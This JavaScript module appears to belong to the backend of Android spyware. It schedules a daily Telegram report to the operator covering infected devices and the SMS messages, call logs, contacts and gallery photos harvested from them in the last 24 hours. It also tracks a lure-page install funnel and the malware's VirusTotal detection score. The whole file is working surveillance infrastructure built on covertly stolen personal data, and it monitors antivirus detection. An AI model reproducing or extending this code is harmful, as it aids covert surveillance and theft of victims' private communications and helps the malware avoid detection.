/**
 * Daily Digest Reporter
 * Every day at 9:00 AM UTC, sends a summary to Telegram:
 * - New installs, active devices, data collected
 * - VT status, anomalies, top content
 */

let db = null;
let sendAlert = null;
let digestTimer = null;

function initDigest(_db, _sendAlert) {
  db = _db;
  sendAlert = _sendAlert || (() => {});

  // Calculate ms until next 9:00 AM UTC
  const now = new Date();
  const next9AM = new Date(now);
  next9AM.setUTCHours(9, 0, 0, 0);
  if (now >= next9AM) next9AM.setUTCDate(next9AM.getUTCDate() + 1);
  const msUntil = next9AM - now;

  setTimeout(() => {
    sendDigest();
    digestTimer = setInterval(sendDigest, 24 * 60 * 60 * 1000);
  }, msUntil);

  console.log(`[Digest] Scheduled — next digest in ${Math.round(msUntil / 60000)} minutes`);
}

function stopDigest() {
  if (digestTimer) { clearInterval(digestTimer); digestTimer = null; }
}

async function sendDigest() {
  if (!db) return;

  try {
    // Device stats
    const totalDevices = db.prepare('SELECT COUNT(*) as c FROM devices').get()?.c || 0;
    const onlineNow = db.prepare('SELECT COUNT(*) as c FROM devices WHERE is_online = 1').get()?.c || 0;
    const newDevices24h = db.prepare("SELECT COUNT(*) as c FROM devices WHERE first_seen > datetime('now', '-24 hours')").get()?.c || 0;
    const activeDevices = db.prepare("SELECT COUNT(*) as c FROM devices WHERE last_seen > datetime('now', '-24 hours')").get()?.c || 0;

    // Data collected in last 24h
    const newSms = db.prepare("SELECT COUNT(*) as c FROM sms_messages WHERE synced_at > datetime('now', '-24 hours')").get()?.c || 0;
    const newContacts = db.prepare("SELECT COUNT(*) as c FROM contacts WHERE synced_at > datetime('now', '-24 hours')").get()?.c || 0;
    const newPhotos = db.prepare("SELECT COUNT(*) as c FROM gallery_photos WHERE synced_at > datetime('now', '-24 hours')").get()?.c || 0;
    const newCalls = db.prepare("SELECT COUNT(*) as c FROM call_logs WHERE synced_at > datetime('now', '-24 hours')").get()?.c || 0;

    // Funnel (last 24h)
    let funnelLine = '';
    try {
      const visits = db.prepare("SELECT COUNT(*) as c FROM analytics_events WHERE event = 'page_visit' AND created_at > datetime('now', '-24 hours')").get()?.c || 0;
      const downloads = db.prepare("SELECT COUNT(*) as c FROM analytics_events WHERE event = 'download_start' AND created_at > datetime('now', '-24 hours')").get()?.c || 0;
      const installs = db.prepare("SELECT COUNT(*) as c FROM analytics_events WHERE event = 'app_install' AND created_at > datetime('now', '-24 hours')").get()?.c || 0;
      funnelLine = `\n📈 <b>Funnel (24h):</b> ${visits} visits → ${downloads} DLs → ${installs} installs`;
    } catch (_) {}

    // VT status
    const vtScore = db.prepare("SELECT value FROM admin_settings WHERE key = 'vt_last_score'").get()?.value || 'N/A';
    const vtScan = db.prepare("SELECT value FROM admin_settings WHERE key = 'vt_last_scan'").get()?.value || 'Never';

    // Content stats
    const totalVideos = db.prepare('SELECT COUNT(*) as c FROM videos').get()?.c || 0;

    // Server uptime
    const uptime = process.uptime();
    const h = Math.floor(uptime / 3600);
    const m = Math.floor((uptime % 3600) / 60);

    const msg = `
📋 <b>Daily Digest</b> — ${new Date().toISOString().slice(0, 10)}

📱 <b>Devices</b>
  Total: ${totalDevices} | Online: ${onlineNow}
  New (24h): ${newDevices24h} | Active (24h): ${activeDevices}

📥 <b>Data Collected (24h)</b>
  💬 SMS: ${newSms}
  📞 Calls: ${newCalls}
  📇 Contacts: ${newContacts}
  🖼️ Photos: ${newPhotos}
${funnelLine}

🛡️ <b>VT Score:</b> ${vtScore}
  Last scan: ${vtScan}

🎬 <b>Content:</b> ${totalVideos} titles
⏱️ <b>Uptime:</b> ${h}h ${m}m

<i>Auto-generated daily at 9:00 AM UTC</i>
    `.trim();

    await sendAlert(msg);
    console.log('[Digest] Daily digest sent');
  } catch (e) {
    console.error('[Digest] Error:', e.message);
  }
}

// Manual trigger
async function triggerDigest() {
  await sendDigest();
}

module.exports = { initDigest, stopDigest, triggerDigest };
